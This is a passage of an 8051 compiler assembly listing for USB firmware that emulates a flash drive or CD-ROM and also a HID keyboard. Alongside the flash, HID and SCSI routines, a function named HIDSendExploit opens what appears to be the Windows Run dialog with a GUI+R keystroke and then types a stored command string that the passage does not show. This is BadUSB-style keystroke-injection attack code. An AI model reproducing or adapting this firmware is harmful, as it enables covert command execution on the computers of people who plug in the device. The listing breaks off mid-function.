                                           ; SOURCE LINE # 506
0069 900000      R     MOV     DPTR,#SendBuffer
006C E0                MOVX    A,@DPTR
006D FB                MOV     R3,A
006E A3                INC     DPTR
006F E0                MOVX    A,@DPTR
0070 FA                MOV     R2,A
0071 A3                INC     DPTR
0072 E0                MOVX    A,@DPTR
0073 F9                MOV     R1,A
0074 8F82              MOV     DPL,R7
0076 8E83              MOV     DPH,R6
0078 120000      E     LCALL   ?C?CLDOPTR
007B F5F9              MOV     SPI0_DATA,A
007D         ?C0082:
007D 30FBFD            JNB     S0_FREE,?C0082
                                           ; SOURCE LINE # 507
0080 0F                INC     R7
0081 BF0001            CJNE    R7,#00H,?C0337
0084 0E                INC     R6
0085         ?C0337:
0085 80D5              SJMP    ?C0079
0087         ?C0080:
                                           ; SOURCE LINE # 508
0087 D294              SETB    SPI_CS
                                           ; SOURCE LINE # 509
0089 120000      R     LCALL   WriteFlashForbidden
                                           ; SOURCE LINE # 510
008C 020000      R     LJMP    WaitFlashBusy
             ; FUNCTION _BulkWriteFlash (END)

             ; FUNCTION HIDSendData (BEGIN)
                                           ; SOURCE LINE # 519
                                           ; SOURCE LINE # 520
                                           ; SOURCE LINE # 521
0000 C8                XCH     A,R0
0001 7400        R     MOV     A,#LOW Ep2Buffer
0003 C8                XCH     A,R0
0004 CC                XCH     A,R4
0005 7400        R     MOV     A,#HIGH Ep2Buffer
0007 CC                XCH     A,R4
0008 CD                XCH     A,R5
0009 7401              MOV     A,#01H
000B CD                XCH     A,R5
000C 7B01              MOV     R3,#01H
000E 7A00        R     MOV     R2,#HIGH HIDData
0010 7900        R     MOV     R1,#LOW HIDData
0012 7E00              MOV     R6,#00H
0014 7F08              MOV     R7,#08H
0016 120000      E     LCALL   ?C?COPY
                                           ; SOURCE LINE # 522
0019 75D508            MOV     UEP2_T_LEN,#08H
                                           ; SOURCE LINE # 523
001C 53D4FC            ANL     UEP2_CTRL,#0FCH
                                           ; SOURCE LINE # 524
001F 22                RET     
             ; FUNCTION HIDSendData (END)

             ; FUNCTION _SendKey (BEGIN)
                                           ; SOURCE LINE # 535
;---- Variable 'Key' assigned to Register 'R5' ----
;---- Variable 'FunctionKey' assigned to Register 'R7' ----
                                           ; SOURCE LINE # 536
                                           ; SOURCE LINE # 537
0000 E4                CLR     A
0001 900000      R     MOV     DPTR,#IsHIDDataSent
0004 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 538
0005 900000      R     MOV     DPTR,#HIDData
0008 EF                MOV     A,R7
0009 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 539
000A CF                XCH     A,R7
000B ED                MOV     A,R5
000C CF                XCH     A,R7
000D 900000      R     MOV     DPTR,#HIDData+02H
0010 EF                MOV     A,R7
0011 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 540
0012 120000      R     LCALL   HIDSendData
0015         ?C0086:
                                           ; SOURCE LINE # 541
0015 900000      R     MOV     DPTR,#IsHIDDataSent
0018 E0                MOVX    A,@DPTR
0019 60FA              JZ      ?C0086
                                           ; SOURCE LINE # 542
001B 7F05              MOV     R7,#05H
001D 7E00              MOV     R6,#00H
001F 120000      E     LCALL   _mDelaymS
                                           ; SOURCE LINE # 544
0022 E4                CLR     A
0023 900000      R     MOV     DPTR,#IsHIDDataSent
0026 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 545
0027 900000      R     MOV     DPTR,#HIDData
002A F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 546
002B 900000      R     MOV     DPTR,#HIDData+02H
002E F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 547
002F 120000      R     LCALL   HIDSendData
0032         ?C0088:
                                           ; SOURCE LINE # 548
0032 900000      R     MOV     DPTR,#IsHIDDataSent
0035 E0                MOVX    A,@DPTR
0036 60FA              JZ      ?C0088
                                           ; SOURCE LINE # 549
0038 7F05              MOV     R7,#05H
003A 7E00              MOV     R6,#00H
003C 020000      E     LJMP    _mDelaymS
             ; FUNCTION _SendKey (END)

             ; FUNCTION _SendString (BEGIN)
                                           ; SOURCE LINE # 560
0000 900000      R     MOV     DPTR,#s
0003 EB                MOV     A,R3
0004 F0                MOVX    @DPTR,A
0005 A3                INC     DPTR
0006 EA                MOV     A,R2
0007 F0                MOVX    @DPTR,A
0008 A3                INC     DPTR
0009 E9                MOV     A,R1
000A F0                MOVX    @DPTR,A
000B A3                INC     DPTR
000C ED                MOV     A,R5
000D F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 561
                                           ; SOURCE LINE # 563
000E E4                CLR     A
000F A3                INC     DPTR
0010 F0                MOVX    @DPTR,A
0011         ?C0091:
0011 900000      R     MOV     DPTR,#num
0014 E0                MOVX    A,@DPTR
0015 FF                MOV     R7,A
0016 A3                INC     DPTR
0017 E0                MOVX    A,@DPTR
0018 FE                MOV     R6,A
0019 C3                CLR     C
001A 9F                SUBB    A,R7
001B 4003              JC      $ + 5H
001D 020000      R     LJMP    ?C0137
                                           ; SOURCE LINE # 564
                                           ; SOURCE LINE # 565
0020 900000      R     MOV     DPTR,#s
0023 E0                MOVX    A,@DPTR
0024 FB                MOV     R3,A
0025 A3                INC     DPTR
0026 E0                MOVX    A,@DPTR
0027 FA                MOV     R2,A
0028 A3                INC     DPTR
0029 E0                MOVX    A,@DPTR
002A F9                MOV     R1,A
002B 8E82              MOV     DPL,R6
002D 758300            MOV     DPH,#00H
0030 120000      E     LCALL   ?C?CLDOPTR
0033 FF                MOV     R7,A
0034 C3                CLR     C
0035 9461              SUBB    A,#061H
0037 4012              JC      ?C0094
0039 EF                MOV     A,R7
003A D3                SETB    C
003B 947A              SUBB    A,#07AH
003D 500C              JNC     ?C0094
                                           ; SOURCE LINE # 566
003F 8E82              MOV     DPL,R6
0041 758300            MOV     DPH,#00H
0044 120000      E     LCALL   ?C?CLDOPTR
0047 24A3              ADD     A,#0A3H
                                           ; SOURCE LINE # 567
0049 8066              SJMP    ?C0340
004B         ?C0094:
004B 900000      R     MOV     DPTR,#s
004E E0                MOVX    A,@DPTR
004F FB                MOV     R3,A
0050 A3                INC     DPTR
0051 E0                MOVX    A,@DPTR
0052 FA                MOV     R2,A
0053 A3                INC     DPTR
0054 E0                MOVX    A,@DPTR
0055 F9                MOV     R1,A
0056 900000      R     MOV     DPTR,#i
0059 E0                MOVX    A,@DPTR
005A F582              MOV     DPL,A
005C 758300            MOV     DPH,#00H
005F 120000      E     LCALL   ?C?CLDOPTR
0062 FF                MOV     R7,A
0063 C3                CLR     C
0064 9441              SUBB    A,#041H
0066 4018              JC      ?C0096
0068 EF                MOV     A,R7
0069 D3                SETB    C
006A 945A              SUBB    A,#05AH
006C 5012              JNC     ?C0096
                                           ; SOURCE LINE # 568
006E 900000      R     MOV     DPTR,#i
0071 E0                MOVX    A,@DPTR
0072 F582              MOV     DPL,A
0074 758300            MOV     DPH,#00H
0077 120000      E     LCALL   ?C?CLDOPTR
007A 24C3              ADD     A,#0C3H
007C FD                MOV     R5,A
                                           ; SOURCE LINE # 569
007D 020000      R     LJMP    ?C0374
0080         ?C0096:
0080 900000      R     MOV     DPTR,#s
0083 E0                MOVX    A,@DPTR
0084 FB                MOV     R3,A
0085 A3                INC     DPTR
0086 E0                MOVX    A,@DPTR
0087 FA                MOV     R2,A
0088 A3                INC     DPTR
0089 E0                MOVX    A,@DPTR
008A F9                MOV     R1,A
008B 900000      R     MOV     DPTR,#i
008E E0                MOVX    A,@DPTR
008F F582              MOV     DPL,A
0091 758300            MOV     DPH,#00H
0094 120000      E     LCALL   ?C?CLDOPTR
0097 FF                MOV     R7,A
0098 C3                CLR     C
0099 9431              SUBB    A,#031H
009B 4018              JC      ?C0098
009D EF                MOV     A,R7
009E D3                SETB    C
009F 9439              SUBB    A,#039H
00A1 5012              JNC     ?C0098
                                           ; SOURCE LINE # 570
00A3 900000      R     MOV     DPTR,#i
00A6 E0                MOVX    A,@DPTR
00A7 F582              MOV     DPL,A
00A9 758300            MOV     DPH,#00H
00AC 120000      E     LCALL   ?C?CLDOPTR
00AF 24ED              ADD     A,#0EDH
00B1         ?C0340:
00B1 FD                MOV     R5,A
                                           ; SOURCE LINE # 571
00B2 020000      R     LJMP    ?C0375
00B5         ?C0098:
                                           ; SOURCE LINE # 572
00B5 900000      R     MOV     DPTR,#s
00B8 E0                MOVX    A,@DPTR
00B9 FB                MOV     R3,A
00BA A3                INC     DPTR
00BB E0                MOVX    A,@DPTR
00BC FA                MOV     R2,A
00BD A3                INC     DPTR
00BE E0                MOVX    A,@DPTR
00BF F9                MOV     R1,A
00C0 900000      R     MOV     DPTR,#i
00C3 E0                MOVX    A,@DPTR
00C4 F582              MOV     DPL,A
00C6 758300            MOV     DPH,#00H
00C9 120000      E     LCALL   ?C?CLDOPTR
00CC 120000      E     LCALL   ?C?CCASE
00CF 0000        R     DW      ?C0135
00D1 09                DB      09H
00D2 0000        R     DW      ?C0136
00D4 0A                DB      0AH
00D5 0000        R     DW      ?C0102
00D7 20                DB      020H
00D8 0000        R     DW      ?C0103
00DA 21                DB      021H
00DB 0000        R     DW      ?C0128
00DD 22                DB      022H
00DE 0000        R     DW      ?C0105
00E0 23                DB      023H
00E1 0000        R     DW      ?C0106
00E3 24                DB      024H
00E4 0000        R     DW      ?C0107
00E6 25                DB      025H
00E7 0000        R     DW      ?C0109
00E9 26                DB      026H
00EA 0000        R     DW      ?C0127
00EC 27                DB      027H
00ED 0000        R     DW      ?C0111
00EF 28                DB      028H
00F0 0000        R     DW      ?C0112
00F2 29                DB      029H
00F3 0000        R     DW      ?C0110
00F5 2A                DB      02AH
00F6 0000        R     DW      ?C0116
00F8 2B                DB      02BH
00F9 0000        R     DW      ?C0129
00FB 2C                DB      02CH
00FC 0000        R     DW      ?C0113
00FE 2D                DB      02DH
00FF 0000        R     DW      ?C0131
0101 2E                DB      02EH
0102 0000        R     DW      ?C0133
0104 2F                DB      02FH
0105 0000        R     DW      ?C0101
0107 30                DB      030H
0108 0000        R     DW      ?C0124
010A 3A                DB      03AH
010B 0000        R     DW      ?C0123
010D 3B                DB      03BH
010E 0000        R     DW      ?C0130
0110 3C                DB      03CH
0111 0000        R     DW      ?C0115
0113 3D                DB      03DH
0114 0000        R     DW      ?C0132
0116 3E                DB      03EH
0117 0000        R     DW      ?C0134
0119 3F                DB      03FH
011A 0000        R     DW      ?C0104
011C 40                DB      040H
011D 0000        R     DW      ?C0117
011F 5B                DB      05BH
0120 0000        R     DW      ?C0121
0122 5C                DB      05CH
0123 0000        R     DW      ?C0119
0125 5D                DB      05DH
0126 0000        R     DW      ?C0108
0128 5E                DB      05EH
0129 0000        R     DW      ?C0114
012B 5F                DB      05FH
012C 0000        R     DW      ?C0125
012E 60                DB      060H
012F 0000        R     DW      ?C0118
0131 7B                DB      07BH
0132 0000        R     DW      ?C0122
0134 7C                DB      07CH
0135 0000        R     DW      ?C0120
0137 7D                DB      07DH
0138 0000        R     DW      ?C0126
013A 7E                DB      07EH
013B 0000              DW      00H
013D 0000        R     DW      ?C0093
                                           ; SOURCE LINE # 573
013F         ?C0101:
                                           ; SOURCE LINE # 574
013F 7D27              MOV     R5,#027H
0141         ?C0342:
                                           ; SOURCE LINE # 575
0141 020000      R     LJMP    ?C0375
                                           ; SOURCE LINE # 576
0144         ?C0102:
                                           ; SOURCE LINE # 577
0144 7D2C              MOV     R5,#02CH
0146         ?C0343:
                                           ; SOURCE LINE # 578
0146 020000      R     LJMP    ?C0375
                                           ; SOURCE LINE # 579
0149         ?C0103:
                                           ; SOURCE LINE # 580
0149 7D1E              MOV     R5,#01EH
014B         ?C0341:
                                           ; SOURCE LINE # 581
014B 807A              SJMP    ?C0374
                                           ; SOURCE LINE # 582
014D         ?C0104:
                                           ; SOURCE LINE # 583
014D 7D1F              MOV     R5,#01FH
014F         ?C0345:
                                           ; SOURCE LINE # 584
014F 8076              SJMP    ?C0374
                                           ; SOURCE LINE # 585
0151         ?C0105:
                                           ; SOURCE LINE # 586
0151 7D20              MOV     R5,#020H
0153         ?C0346:
                                           ; SOURCE LINE # 587
0153 8072              SJMP    ?C0374
                                           ; SOURCE LINE # 588
0155         ?C0106:
                                           ; SOURCE LINE # 589
0155 7D21              MOV     R5,#021H
0157         ?C0347:
                                           ; SOURCE LINE # 590
0157 806E              SJMP    ?C0374
                                           ; SOURCE LINE # 591
0159         ?C0107:
                                           ; SOURCE LINE # 592
0159 7D22              MOV     R5,#022H
015B         ?C0348:
                                           ; SOURCE LINE # 593
015B 806A              SJMP    ?C0374
                                           ; SOURCE LINE # 594
015D         ?C0108:
                                           ; SOURCE LINE # 595
015D 7D23              MOV     R5,#023H
015F         ?C0349:
                                           ; SOURCE LINE # 596
015F 8066              SJMP    ?C0374
                                           ; SOURCE LINE # 597
0161         ?C0109:
                                           ; SOURCE LINE # 598
0161 7D24              MOV     R5,#024H
0163         ?C0350:
                                           ; SOURCE LINE # 599
0163 8062              SJMP    ?C0374
                                           ; SOURCE LINE # 600
0165         ?C0110:
                                           ; SOURCE LINE # 601
0165 7D25              MOV     R5,#025H
0167         ?C0351:
                                           ; SOURCE LINE # 602
0167 805E              SJMP    ?C0374
                                           ; SOURCE LINE # 603
0169         ?C0111:
                                           ; SOURCE LINE # 604
0169 7D26              MOV     R5,#026H
016B         ?C0352:
                                           ; SOURCE LINE # 605
016B 805A              SJMP    ?C0374
                                           ; SOURCE LINE # 606
016D         ?C0112:
                                           ; SOURCE LINE # 607
016D 7D27              MOV     R5,#027H
016F         ?C0353:
                                           ; SOURCE LINE # 608
016F 8056              SJMP    ?C0374
                                           ; SOURCE LINE # 609
0171         ?C0113:
                                           ; SOURCE LINE # 610
0171 7D2D              MOV     R5,#02DH
0173         ?C0344:
                                           ; SOURCE LINE # 611
0173 8058              SJMP    ?C0375
                                           ; SOURCE LINE # 612
0175         ?C0114:
                                           ; SOURCE LINE # 613
0175 7D2D              MOV     R5,#02DH
0177         ?C0354:
                                           ; SOURCE LINE # 614
0177 804E              SJMP    ?C0374
                                           ; SOURCE LINE # 615
0179         ?C0115:
                                           ; SOURCE LINE # 616
0179 7D2E              MOV     R5,#02EH
017B         ?C0355:
                                           ; SOURCE LINE # 617
017B 8050              SJMP    ?C0375
                                           ; SOURCE LINE # 618
017D         ?C0116:
                                           ; SOURCE LINE # 619
017D 7D2E              MOV     R5,#02EH
017F         ?C0356:
                                           ; SOURCE LINE # 620
017F 8046              SJMP    ?C0374
                                           ; SOURCE LINE # 621
0181         ?C0117:
                                           ; SOURCE LINE # 622
0181 7D2F              MOV     R5,#02FH
0183         ?C0357:
                                           ; SOURCE LINE # 623
0183 8048              SJMP    ?C0375
                                           ; SOURCE LINE # 624
0185         ?C0118:
                                           ; SOURCE LINE # 625
0185 7D2F              MOV     R5,#02FH
0187         ?C0358:
                                           ; SOURCE LINE # 626
0187 803E              SJMP    ?C0374
                                           ; SOURCE LINE # 627
0189         ?C0119:
                                           ; SOURCE LINE # 628
0189 7D30              MOV     R5,#030H
018B         ?C0359:
                                           ; SOURCE LINE # 629
018B 8040              SJMP    ?C0375
                                           ; SOURCE LINE # 630
018D         ?C0120:
                                           ; SOURCE LINE # 631
018D 7D30              MOV     R5,#030H
018F         ?C0360:
                                           ; SOURCE LINE # 632
018F 8036              SJMP    ?C0374
                                           ; SOURCE LINE # 633
0191         ?C0121:
                                           ; SOURCE LINE # 634
0191 7D31              MOV     R5,#031H
0193         ?C0361:
                                           ; SOURCE LINE # 635
0193 8038              SJMP    ?C0375
                                           ; SOURCE LINE # 636
0195         ?C0122:
                                           ; SOURCE LINE # 637
0195 7D31              MOV     R5,#031H
0197         ?C0362:
                                           ; SOURCE LINE # 638
0197 802E              SJMP    ?C0374
                                           ; SOURCE LINE # 639
0199         ?C0123:
                                           ; SOURCE LINE # 640
0199 7D33              MOV     R5,#033H
019B         ?C0363:
                                           ; SOURCE LINE # 641
019B 8030              SJMP    ?C0375
                                           ; SOURCE LINE # 642
019D         ?C0124:
                                           ; SOURCE LINE # 643
019D 7D33              MOV     R5,#033H
019F         ?C0364:
                                           ; SOURCE LINE # 644
019F 8026              SJMP    ?C0374
                                           ; SOURCE LINE # 645
01A1         ?C0125:
                                           ; SOURCE LINE # 646
01A1 7D32              MOV     R5,#032H
01A3         ?C0365:
                                           ; SOURCE LINE # 647
01A3 8028              SJMP    ?C0375
                                           ; SOURCE LINE # 648
01A5         ?C0126:
                                           ; SOURCE LINE # 649
01A5 7D32              MOV     R5,#032H
01A7         ?C0366:
                                           ; SOURCE LINE # 650
01A7 801E              SJMP    ?C0374
                                           ; SOURCE LINE # 651
01A9         ?C0127:
                                           ; SOURCE LINE # 652
01A9 7D34              MOV     R5,#034H
01AB         ?C0367:
                                           ; SOURCE LINE # 653
01AB 8020              SJMP    ?C0375
                                           ; SOURCE LINE # 654
01AD         ?C0128:
                                           ; SOURCE LINE # 655
01AD 7D34              MOV     R5,#034H
01AF         ?C0368:
                                           ; SOURCE LINE # 656
01AF 8016              SJMP    ?C0374
                                           ; SOURCE LINE # 657
01B1         ?C0129:
                                           ; SOURCE LINE # 658
01B1 7D36              MOV     R5,#036H
01B3         ?C0369:
                                           ; SOURCE LINE # 659
01B3 8018              SJMP    ?C0375
                                           ; SOURCE LINE # 660
01B5         ?C0130:
                                           ; SOURCE LINE # 661
01B5 7D36              MOV     R5,#036H
01B7         ?C0370:
                                           ; SOURCE LINE # 662
01B7 800E              SJMP    ?C0374
                                           ; SOURCE LINE # 663
01B9         ?C0131:
                                           ; SOURCE LINE # 664
01B9 7D37              MOV     R5,#037H
01BB         ?C0371:
                                           ; SOURCE LINE # 665
01BB 8010              SJMP    ?C0375
                                           ; SOURCE LINE # 666
01BD         ?C0132:
                                           ; SOURCE LINE # 667
01BD 7D37              MOV     R5,#037H
01BF         ?C0372:
                                           ; SOURCE LINE # 668
01BF 8006              SJMP    ?C0374
                                           ; SOURCE LINE # 669
01C1         ?C0133:
                                           ; SOURCE LINE # 670
01C1 7D38              MOV     R5,#038H
01C3         ?C0373:
                                           ; SOURCE LINE # 671
01C3 8008              SJMP    ?C0375
                                           ; SOURCE LINE # 672
01C5         ?C0134:
                                           ; SOURCE LINE # 673
01C5 7D38              MOV     R5,#038H
01C7         ?C0374:
01C7 7F02              MOV     R7,#02H
                                           ; SOURCE LINE # 674
01C9 800A              SJMP    ?C0377
                                           ; SOURCE LINE # 675
01CB         ?C0135:
                                           ; SOURCE LINE # 676
01CB 7D2B              MOV     R5,#02BH
01CD         ?C0375:
01CD E4                CLR     A
01CE FF                MOV     R7,A
01CF         ?C0376:
                                           ; SOURCE LINE # 677
01CF 8004              SJMP    ?C0377
                                           ; SOURCE LINE # 678
01D1         ?C0136:
                                           ; SOURCE LINE # 679
01D1 7D28              MOV     R5,#028H
01D3 E4                CLR     A
01D4 FF                MOV     R7,A
01D5         ?C0377:
01D5 120000      R     LCALL   _SendKey
                                           ; SOURCE LINE # 680
                                           ; SOURCE LINE # 681
                                           ; SOURCE LINE # 682
                                           ; SOURCE LINE # 683
01D8         ?C0093:
01D8 900000      R     MOV     DPTR,#i
01DB E0                MOVX    A,@DPTR
01DC 04                INC     A
01DD F0                MOVX    @DPTR,A
01DE 020000      R     LJMP    ?C0091
                                           ; SOURCE LINE # 684
01E1         ?C0137:
01E1 22                RET     
             ; FUNCTION _SendString (END)

             ; FUNCTION HIDSendExploit (BEGIN)
                                           ; SOURCE LINE # 686
                                           ; SOURCE LINE # 687
                                           ; SOURCE LINE # 688
0000 7FD0              MOV     R7,#0D0H
0002 7E07              MOV     R6,#07H
0004 120000      E     LCALL   _mDelaymS
                                           ; SOURCE LINE # 689
0007 7D15              MOV     R5,#015H
0009 7F08              MOV     R7,#08H
000B 120000      R     LCALL   _SendKey
                                           ; SOURCE LINE # 690
000E 7FE8              MOV     R7,#0E8H
0010 7E03              MOV     R6,#03H
0012 120000      E     LCALL   _mDelaymS
                                           ; SOURCE LINE # 691
0015 7BFF              MOV     R3,#0FFH
0017 7A00        R     MOV     R2,#HIGH ?SC_0
0019 7900        R     MOV     R1,#LOW ?SC_0
001B 7D34              MOV     R5,#034H
001D 120000      R     LCALL   _SendString
                                           ; SOURCE LINE # 692
0020 7FE8              MOV     R7,#0E8H
0022 7E03              MOV     R6,#03H
0024 020000      E     LJMP    _mDelaymS
             ; FUNCTION HIDSendExploit (END)

             ; FUNCTION L?0402 (BEGIN)
0000 C200        R     CLR     CH375BULKUP
0002 900000      R     MOV     DPTR,#mSenseKey
0005 7405              MOV     A,#05H
0007 F0                MOVX    @DPTR,A
0008 900000      R     MOV     DPTR,#mASC
000B 7420              MOV     A,#020H
000D F0                MOVX    @DPTR,A
000E 900000      R     MOV     DPTR,#BcswStatus
0011 7401              MOV     A,#01H
0013 F0                MOVX    @DPTR,A
0014 7F0F              MOV     R7,#0FH
             ; FUNCTION _BulkThirteen (BEGIN)
                                           ; SOURCE LINE # 696
;---- Variable 'Case' assigned to Register 'R7' ----
                                           ; SOURCE LINE # 697
                                           ; SOURCE LINE # 698
0016 EF                MOV     A,R7
0017 B41000            CJNE    A,#010H,?C0338
001A         ?C0338:
001A 5073              JNC     ?C0157
001C 900000      R     MOV     DPTR,#?C0339
001F F8                MOV     R0,A
0020 28                ADD     A,R0
0021 28                ADD     A,R0
0022 73                JMP     @A+DPTR
0023         ?C0339:
0023 020000      R     LJMP    ?C0142
0026 020000      R     LJMP    ?C0142
0029 020000      R     LJMP    ?C0145
002C 020000      R     LJMP    ?C0145
002F 020000      R     LJMP    ?C0147
0032 020000      R     LJMP    ?C0147
0035 020000      R     LJMP    ?C0142
0038 020000      R     LJMP    ?C0149
003B 020000      R     LJMP    ?C0149
003E 020000      R     LJMP    ?C0151
0041 020000      R     LJMP    ?C0153
0044 020000      R     LJMP    ?C0151
0047 020000      R     LJMP    ?C0143
004A 020000      R     LJMP    ?C0153
004D 020000      R     LJMP    ?C0154
0050 020000      R     LJMP    ?C0147
                                           ; SOURCE LINE # 699
                                           ; SOURCE LINE # 700
                                           ; SOURCE LINE # 701
                                           ; SOURCE LINE # 702
0053         ?C0142:
                                           ; SOURCE LINE # 703
                                           ; SOURCE LINE # 704
0053 8000              SJMP    ?C0378
                                           ; SOURCE LINE # 705
0055         ?C0143:
                                           ; SOURCE LINE # 706
0055         ?C0378:
0055 E4                CLR     A
0056 900000      R     MOV     DPTR,#BcswStatus
0059 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 707
005A 22                RET     
                                           ; SOURCE LINE # 708
                                           ; SOURCE LINE # 709
005B         ?C0145:
                                           ; SOURCE LINE # 710
                                           ; SOURCE LINE # 711
                                           ; SOURCE LINE # 713
                                           ; SOURCE LINE # 714
005B 8002              SJMP    ?C0379
                                           ; SOURCE LINE # 715
                                           ; SOURCE LINE # 716
005D         ?C0147:
                                           ; SOURCE LINE # 717
                                           ; SOURCE LINE # 718
                                           ; SOURCE LINE # 720
                                           ; SOURCE LINE # 721
005D 8025              SJMP    ?C0380
                                           ; SOURCE LINE # 722
                                           ; SOURCE LINE # 723
005F         ?C0149:
                                           ; SOURCE LINE # 724
005F         ?C0379:
005F 43D203            ORL     UEP1_CTRL,#03H
                                           ; SOURCE LINE # 725
0062 D200        R     SETB    FSTALL
                                           ; SOURCE LINE # 727
                                           ; SOURCE LINE # 728
0064 8017              SJMP    ?C0383
                                           ; SOURCE LINE # 729
                                           ; SOURCE LINE # 730
0066         ?C0151:
                                           ; SOURCE LINE # 731
0066 43D20C            ORL     UEP1_CTRL,#0CH
                                           ; SOURCE LINE # 732
                                           ; SOURCE LINE # 734
                                           ; SOURCE LINE # 735
0069 801C              SJMP    ?C0382
                                           ; SOURCE LINE # 736
                                           ; SOURCE LINE # 737
006B         ?C0153:
                                           ; SOURCE LINE # 738
006B 43D203            ORL     UEP1_CTRL,#03H
                                           ; SOURCE LINE # 739
006E D200        R     SETB    FSTALL
                                           ; SOURCE LINE # 741
0070 43D20C            ORL     UEP1_CTRL,#0CH
                                           ; SOURCE LINE # 743
0073         ?C0381:
                                           ; SOURCE LINE # 744
0073 8008              SJMP    ?C0383
                                           ; SOURCE LINE # 745
0075         ?C0154:
                                           ; SOURCE LINE # 746
0075 43D203            ORL     UEP1_CTRL,#03H
                                           ; SOURCE LINE # 747
0078 D200        R     SETB    FSTALL
                                           ; SOURCE LINE # 748
007A 43D20C            ORL     UEP1_CTRL,#0CH
                                           ; SOURCE LINE # 750
007D         ?C0383:
007D 900000      R     MOV     DPTR,#BcswStatus
0080 7402              MOV     A,#02H
0082 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 751
0083 22                RET     
                                           ; SOURCE LINE # 752
0084         ?C0380:
0084 43D203            ORL     UEP1_CTRL,#03H
                                           ; SOURCE LINE # 754
0087         ?C0382:
0087 D200        R     SETB    FSTALL
                                           ; SOURCE LINE # 756
0089 900000      R     MOV     DPTR,#BcswStatus
008C 7401              MOV     A,#01H
008E F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 757
                                           ; SOURCE LINE # 758
                                           ; SOURCE LINE # 759
                                           ; SOURCE LINE # 760
                                           ; SOURCE LINE # 761
008F         ?C0157:
008F 22                RET     
             ; FUNCTION _BulkThirteen (END)

             ; FUNCTION UFI_readCapacity (BEGIN)
                                           ; SOURCE LINE # 764
                                           ; SOURCE LINE # 765
                                           ; SOURCE LINE # 766
0000 900000      R     MOV     DPTR,#pBuf
0003 74FF              MOV     A,#0FFH
0005 F0                MOVX    @DPTR,A
0006 A3                INC     DPTR
0007 7400        R     MOV     A,#HIGH DBCAPACITY
0009 F0                MOVX    @DPTR,A
000A A3                INC     DPTR
000B 7400        R     MOV     A,#LOW DBCAPACITY
000D F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 767
000E E4                CLR     A
000F 7F08              MOV     R7,#08H
0011 FE                MOV     R6,A
0012 FD                MOV     R5,A
0013 FC                MOV     R4,A
0014 900000      R     MOV     DPTR,#LEN
0017 E0                MOVX    A,@DPTR
0018 F8                MOV     R0,A
0019 A3                INC     DPTR
001A E0                MOVX    A,@DPTR
001B F9                MOV     R1,A
001C A3                INC     DPTR
001D E0                MOVX    A,@DPTR
001E FA                MOV     R2,A
001F A3                INC     DPTR
0020 E0                MOVX    A,@DPTR
0021 FB                MOV     R3,A
0022 D3                SETB    C
0023 120000      E     LCALL   ?C?ULCMP
0026 400A              JC      ?C0158
                                           ; SOURCE LINE # 768
0028 900000      R     MOV     DPTR,#LEN
002B 120000      E     LCALL   ?C?LSTKXDATA
002E 00                DB      00H
002F 00                DB      00H
0030 00                DB      00H
0031 08                DB      08H
0032         ?C0158:
                                           ; SOURCE LINE # 769
0032 E4                CLR     A
0033 900000      R     MOV     DPTR,#BcswStatus
0036 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 770
0037 900000      R     MOV     DPTR,#mSenseKey
003A F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 771
003B 900000      R     MOV     DPTR,#mASC
003E F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 772
003F 22                RET     
             ; FUNCTION UFI_readCapacity (END)

             ; FUNCTION UFI_inquiry (BEGIN)
                                           ; SOURCE LINE # 775
                                           ; SOURCE LINE # 776
                                           ; SOURCE LINE # 777
0000 209134            JB      Key_ModeSelect,?C0160
                                           ; SOURCE LINE # 778
                                           ; SOURCE LINE # 779
0003 900000      R     MOV     DPTR,#pBuf
0006 74FF              MOV     A,#0FFH
0008 F0                MOVX    @DPTR,A
0009 A3                INC     DPTR
000A 7400        R     MOV     A,#HIGH DBINQUITY_USB_Drive
000C F0                MOVX    @DPTR,A
000D A3                INC     DPTR
000E 7400        R     MOV     A,#LOW DBINQUITY_USB_Drive
0010 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 780
0011 E4                CLR     A
0012 7F24              MOV     R7,#024H
0014 FE                MOV     R6,A
0015 FD                MOV     R5,A
0016 FC                MOV     R4,A
0017 900000      R     MOV     DPTR,#LEN
001A E0                MOVX    A,@DPTR
001B F8                MOV     R0,A
001C A3                INC     DPTR
001D E0                MOVX    A,@DPTR
001E F9                MOV     R1,A
001F A3                INC     DPTR
0020 E0                MOVX    A,@DPTR
0021 FA                MOV     R2,A
0022 A3                INC     DPTR
0023 E0                MOVX    A,@DPTR
0024 FB                MOV     R3,A
0025 D3                SETB    C
0026 120000      E     LCALL   ?C?ULCMP
0029 403E              JC      ?C0384
                                           ; SOURCE LINE # 781
002B 900000      R     MOV     DPTR,#LEN
002E 120000      E     LCALL   ?C?LSTKXDATA
0031 00                DB      00H
0032 00                DB      00H
0033 00                DB      00H
0034 24                DB      024H
0035         ?C0161:
                                           ; SOURCE LINE # 782
                                           ; SOURCE LINE # 783
                                           ; SOURCE LINE # 784
                                           ; SOURCE LINE # 785
0035 8032              SJMP    ?C0384
0037         ?C0160:
                                           ; SOURCE LINE # 787
                                           ; SOURCE LINE # 788
0037 900000      R     MOV     DPTR,#pBuf
003A 74FF              MOV     A,#0FFH
003C F0                MOVX    @DPTR,A
003D A3                INC     DPTR
003E 7400        R     MOV     A,#HIGH DBINQUITY_CD_ROM
0040 F0                MOVX    @DPTR,A
0041 A3                INC     DPTR
0042 7400        R     MOV     A,#LOW DBINQUITY_CD_ROM
0044 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 789
0045 E4                CLR     A
0046 7F24              MOV     R7,#024H
0048 FE                MOV     R6,A
0049 FD                MOV     R5,A
004A FC                MOV     R4,A
004B 900000      R     MOV     DPTR,#LEN
004E E0                MOVX    A,@DPTR
004F F8                MOV     R0,A
0050 A3                INC     DPTR
0051 E0                MOVX    A,@DPTR
0052 F9                MOV     R1,A
0053 A3                INC     DPTR
0054 E0                MOVX    A,@DPTR
0055 FA                MOV     R2,A
0056 A3                INC     DPTR
